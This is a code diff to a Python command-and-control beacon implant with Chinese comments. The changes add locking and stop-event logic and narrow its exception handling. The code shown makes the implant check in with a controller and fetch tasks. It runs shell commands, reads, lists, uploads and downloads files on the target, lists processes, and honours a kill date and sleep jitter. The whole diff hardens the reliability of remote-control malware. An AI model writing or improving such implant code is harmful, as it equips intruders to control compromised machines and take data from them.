@@ -118,7 +118,11 @@ class Beacon(BaseC2):
 
         # 运行状态
         self._running = False
+        self._starting = False  # 新增：标记是否正在启动中
         self._thread: Optional[threading.Thread] = None
+        self._state_lock = threading.Lock()
+        self._startup_lock = threading.Lock()  # 新增：启动锁，防止并发启动
+        self._stop_event = threading.Event()
         self._mode = BeaconMode.SLEEP
 
         # 编解码器
@@ -156,8 +160,8 @@ class Beacon(BaseC2):
             s.connect(("8.8.8.8", 80))
             ip_address = s.getsockname()[0]
             s.close()
-        except Exception:
-            pass
+        except (OSError, socket.error) as e:
+            logger.debug(f"Failed to get local IP: {e}")
 
         # 检测完整性级别
         integrity = 'medium'
@@ -166,8 +170,9 @@ class Beacon(BaseC2):
                 import ctypes
                 if ctypes.windll.shell32.IsUserAnAdmin():
                     integrity = 'high'
-            except Exception:
-                pass
+            except (ImportError, AttributeError, OSError) as e:
+                logger.debug(f"Failed to check admin status: {e}")
+
         elif os.geteuid() == 0:
             integrity = 'high'
 
@@ -230,8 +235,12 @@ class Beacon(BaseC2):
             self._set_status(C2Status.ERROR)
             return False
 
-        except Exception as e:
+        except (ConnectionError, TimeoutError, OSError) as e:
             logger.error(f"Beacon connect error: {e}")
+            self._set_status(C2Status.ERROR)
+            return False
+        except ValueError as e:
+            logger.error(f"Beacon config error: {e}")
             self._set_status(C2Status.ERROR)
             return False
 
@@ -240,8 +249,9 @@ class Beacon(BaseC2):
         if self._tunnel:
             try:
                 self._tunnel.disconnect()
-            except Exception:
-                pass
+            except (ConnectionError, OSError) as e:
+                logger.warning(f"Error during disconnect: {e}")
+
             self._tunnel = None
 
         self._set_status(C2Status.DISCONNECTED)
@@ -293,39 +303,124 @@ class Beacon(BaseC2):
 
     # ==================== Beacon 循环 ====================
 
+    def _set_running(self, value: bool) -> None:
+        """设置运行状态（线程安全）"""
+        with self._state_lock:
+            self._running = value
+            if value:
+                self._stop_event.clear()
+            else:
+                self._stop_event.set()
+
+    def _is_running(self) -> bool:
+        """
+        检查是否正在运行（线程安全）
+
+        Returns:
+            True 如果 Beacon 正在运行或正在启动中
+        """
+        with self._state_lock:
+            # 正在启动中也算运行
+            if self._starting:
+                return True
+            if not self._running:
+                return False
+            if not self._thread:
+                return False
+            return self._thread.is_alive()
+
+    def _request_stop(self) -> None:
+        """请求停止（线程安全）"""
+        self._set_running(False)
+
     def start(self) -> None:
-        """启动 Beacon 循环"""
-        if self._running:
+        """
+        启动 Beacon 循环
+
+        使用双重锁机制防止并发启动竞态条件：
+        1. _startup_lock: 确保只有一个线程能执行启动流程
+        2. _state_lock: 保护状态变量的读写
+        """
+        # 使用非阻塞方式获取启动锁，防止多个线程同时启动
+        if not self._startup_lock.acquire(blocking=False):
+            logger.debug("Beacon startup already in progress")
             return
 
-        # 检查自毁日期
-        if self.config.kill_date and time.time() > self.config.kill_date:
-            logger.warning("Kill date reached, not starting")
-            return
+        try:
+            with self._state_lock:
+                # 检查是否已经在运行
+                if self._running and self._thread and self._thread.is_alive():
+                    logger.debug("Beacon already running")
+                    return
 
-        # 启动延迟
-        if self.config.initial_delay > 0:
-            time.sleep(self.config.initial_delay)
+                # 检查自毁日期
+                if self.config.kill_date and time.time() > self.config.kill_date:
+                    logger.warning("Kill date reached, not starting")
+                    return
 
-        # 连接
-        if not self.connect():
-            logger.error("Failed to connect, not starting beacon loop")
-            return
+                # 标记为正在启动
+                self._starting = True
+                self._running = True
+                self._stop_event.clear()
 
-        self._running = True
-        self._thread = threading.Thread(target=self._beacon_loop, daemon=True)
-        self._thread.start()
+            # 启动延迟（在锁外执行，避免阻塞其他操作）
+            if self.config.initial_delay > 0:
+                # 使用 _stop_event.wait 代替 time.sleep，支持中断
+                if self._stop_event.wait(self.config.initial_delay):
+                    logger.info("Beacon startup cancelled during delay")
+                    self._cleanup_startup()
+                    return
 
-        logger.info(f"Beacon started: {self.beacon_id}")
+            # 连接（在锁外执行）
+            if not self.connect():
+                logger.error("Failed to connect, not starting beacon loop")
+                self._cleanup_startup()
+                return
+
+            # 创建并启动线程（在锁内）
+            with self._state_lock:
+                # 再次检查，可能在连接期间被停止
+                if not self._running:
+                    logger.info("Beacon stopped during startup")
+                    return
+
+                self._thread = threading.Thread(
+                    target=self._beacon_loop,
+                    daemon=True,
+                    name=f"Beacon-{self.beacon_id[:8]}"
+                )
+                self._thread.start()
+                self._starting = False  # 启动完成
+
+            logger.info(f"Beacon started: {self.beacon_id}")
+
+        finally:
+            self._startup_lock.release()
+
+    def _cleanup_startup(self) -> None:
+        """清理失败的启动状态"""
+        with self._state_lock:
+            self._running = False
+            self._starting = False
+            self._stop_event.set()
 
     def stop(self) -> None:
         """停止 Beacon"""
-        self._running = False
+        # 请求停止
+        self._request_stop()
 
-        if self._thread:
-            self._thread.join(timeout=5.0)
+        # 获取线程引用（在锁内）
+        with self._state_lock:
+            thread = self._thread
             self._thread = None
 
+        # 等待线程结束（在锁外）
+        if thread and thread is not threading.current_thread():
+            thread.join(timeout=5.0)
+            if thread.is_alive():
+                logger.warning("Beacon thread did not stop gracefully")
+
+        # 断开连接
         self.disconnect()
         logger.info("Beacon stopped")
 
@@ -334,8 +429,8 @@ class Beacon(BaseC2):
         self.start()
 
         try:
-            while self._running:
-                time.sleep(1.0)
+            while not self._stop_event.is_set():
+                self._stop_event.wait(1.0)
         except KeyboardInterrupt:
             pass
         finally:
@@ -348,47 +443,54 @@ class Beacon(BaseC2):
 
     def _beacon_loop(self) -> None:
         """Beacon 主循环"""
-        while self._running:
-            try:
-                # 检查自毁日期
-                if self.config.kill_date and time.time() > self.config.kill_date:
-                    logger.warning("Kill date reached, stopping")
-                    self._running = False
-                    break
-
-                # 发送心跳
-                self._send_heartbeat()
-
-                # 获取任务
-                tasks = self._check_tasks()
-
-                # 执行任务
-                for task in tasks:
-                    if not self._running:
+        try:
+            while not self._stop_event.is_set():
+                try:
+                    # 检查自毁日期
+                    if self.config.kill_date and time.time() > self.config.kill_date:
+                        logger.warning("Kill date reached, stopping")
+                        self._request_stop()
                         break
 
-                    result = self.process_task(task)
-                    self._send_result(result)
+                    # 发送心跳
+                    self._send_heartbeat()
 
-                    # 如果是退出任务，停止循环
-                    if task.type == TaskTypes.EXIT:
-                        self._running = False
+                    # 获取任务
+                    tasks = self._check_tasks()
+
+                    # 执行任务
+                    for task in tasks:
+                        if self._stop_event.is_set():
+                            break
+
+                        result = self.process_task(task)
+                        self._send_result(result)
+
+                        # 如果是退出任务，停止循环
+                        if task.type == TaskTypes.EXIT:
+                            self._request_stop()
+                            break
+
+                except (ConnectionError, TimeoutError, OSError) as e:
+                    logger.error(f"Beacon loop network error: {e}")
+
+                    # 尝试重连
+                    if not self._stop_event.is_set() and self.status == C2Status.CONNECTED:
+                        if not self.reconnect():
+                            logger.error("Reconnect failed, stopping")
+                            self._request_stop()
+                            break
+                except (ValueError, KeyError) as e:
+                    logger.error(f"Beacon loop data error: {e}")
+                    # 数据错误不需要重连，继续下一轮
+
+                # 计算睡眠时间
+                if not self._stop_event.is_set():
+                    sleep_time = self._calculate_sleep()
+                    if self._stop_event.wait(sleep_time):
                         break
-
-            except Exception as e:
-                logger.error(f"Beacon loop error: {e}")
-
-                # 尝试重连
-                if self._running and self.status == C2Status.CONNECTED:
-                    if not self.reconnect():
-                        logger.error("Reconnect failed, stopping")
-                        self._running = False
-                        break
-
-            # 计算睡眠时间
-            if self._running:
-                sleep_time = self._calculate_sleep()
-                time.sleep(sleep_time)
+        finally:
+            self._request_stop()
 
         logger.info("Beacon loop ended")
 
@@ -407,8 +509,11 @@ class Beacon(BaseC2):
         try:
             data = self._codec.encode_checkin(self._info)
             return self.send(data)
-        except Exception as e:
-            logger.error(f"Checkin failed: {e}")
+        except (ConnectionError, TimeoutError, OSError) as e:
+            logger.error(f"Checkin network error: {e}")
+            return False
+        except (ValueError, KeyError) as e:
+            logger.error(f"Checkin encode error: {e}")
             return False
 
     def _send_heartbeat(self) -> None:
@@ -416,8 +521,10 @@ class Beacon(BaseC2):
         try:
             data = encode_heartbeat(self.beacon_id)
             self.send(data)
-        except Exception as e:
-            logger.debug(f"Heartbeat failed: {e}")
+        except (ConnectionError, TimeoutError, OSError) as e:
+            logger.debug(f"Heartbeat network error: {e}")
+        except (ValueError, KeyError) as e:
+            logger.debug(f"Heartbeat encode error: {e}")
 
     def _check_tasks(self) -> List[Task]:
         """获取待执行任务"""
@@ -425,8 +532,10 @@ class Beacon(BaseC2):
             response = self.receive()
             if response:
                 return decode_tasks(response)
-        except Exception as e:
-            logger.debug(f"Check tasks failed: {e}")
+        except (ConnectionError, TimeoutError, OSError) as e:
+            logger.debug(f"Check tasks network error: {e}")
+        except (ValueError, KeyError) as e:
+            logger.debug(f"Check tasks decode error: {e}")
 
         return []
 
@@ -435,8 +544,11 @@ class Beacon(BaseC2):
         try:
             data = encode_result(result)
             return self.send(data)
-        except Exception as e:
-            logger.error(f"Send result failed: {e}")
+        except (ConnectionError, TimeoutError, OSError) as e:
+            logger.error(f"Send result network error: {e}")
+            return False
+        except (ValueError, KeyError) as e:
+            logger.error(f"Send result encode error: {e}")
             return False
 
     # ==================== 任务处理器 ====================
@@ -468,8 +580,8 @@ class Beacon(BaseC2):
 
         except subprocess.TimeoutExpired:
             return "[Error] Command timed out"
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except (OSError, subprocess.SubprocessError) as e:
+            return f"[Error] Execution failed: {e}"
 
     def _handle_sleep(self, payload: Any) -> str:
         """修改睡眠时间"""
@@ -489,12 +601,12 @@ class Beacon(BaseC2):
 
             return f"Sleep time set to {self.config.interval}s (jitter: {self.config.jitter})"
 
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except (ValueError, TypeError) as e:
+            return f"[Error] Invalid sleep config: {e}"
 
     def _handle_exit(self, payload: Any) -> str:
         """退出 Beacon"""
-        self._running = False
+        self._request_stop()
         return "Exiting..."
 
     def _handle_checkin(self, payload: Any) -> Dict[str, Any]:
@@ -510,8 +622,8 @@ class Beacon(BaseC2):
         try:
             os.chdir(path)
             return os.getcwd()
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except (OSError, FileNotFoundError, PermissionError) as e:
+            return f"[Error] Cannot change directory: {e}"
 
     def _handle_ls(self, path: str = None) -> str:
         """列出目录内容"""
@@ -526,13 +638,13 @@ class Beacon(BaseC2):
                     is_dir = 'd' if os.path.isdir(full_path) else '-'
                     size = stat.st_size
                     entries.append(f"{is_dir} {size:>10} {entry}")
-                except Exception:
+                except (OSError, PermissionError):
                     entries.append(f"? {'?':>10} {entry}")
 
             return '\n'.join(entries)
 
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except (OSError, FileNotFoundError, PermissionError) as e:
+            return f"[Error] Cannot list directory: {e}"
 
     def _handle_cat(self, path: str) -> str:
         """读取文件内容"""
@@ -540,8 +652,8 @@ class Beacon(BaseC2):
             with open(path, 'r', encoding='utf-8', errors='replace') as f:
                 content = f.read()
             return content[:self.config.max_output_size]
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except (OSError, FileNotFoundError, PermissionError) as e:
+            return f"[Error] Cannot read file: {e}"
 
     def _handle_ps(self, payload: Any) -> str:
         """列出进程"""
@@ -561,8 +673,10 @@ class Beacon(BaseC2):
                     timeout=30
                 )
             return result.stdout[:self.config.max_output_size]
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except subprocess.TimeoutExpired:
+            return "[Error] Process list timed out"
+        except (OSError, subprocess.SubprocessError) as e:
+            return f"[Error] Cannot list processes: {e}"
 
     def _handle_upload(self, payload: Dict[str, Any]) -> str:
         """上传文件到目标"""
@@ -580,8 +694,10 @@ class Beacon(BaseC2):
 
             return f"Uploaded {len(content)} bytes to {path}"
 
-        except Exception as e:
-            return f"[Error] {str(e)}"
+        except (OSError, PermissionError) as e:
+            return f"[Error] Cannot write file: {e}"
+        except (ValueError, TypeError) as e:
+            return f"[Error] Invalid upload data: {e}"
 
     def _handle_download(self, path: str) -> Dict[str, Any]:
         """从目标下载文件"""
@@ -596,8 +712,8 @@ class Beacon(BaseC2):
                 'size': len(content)
             }
 
-        except Exception as e:
-            return {'error': str(e)}
+        except (OSError, FileNotFoundError, PermissionError) as e:
+            return {'error': f"Cannot read file: {e}"}
 
 
 # ==================== Beacon 服务器 ====================
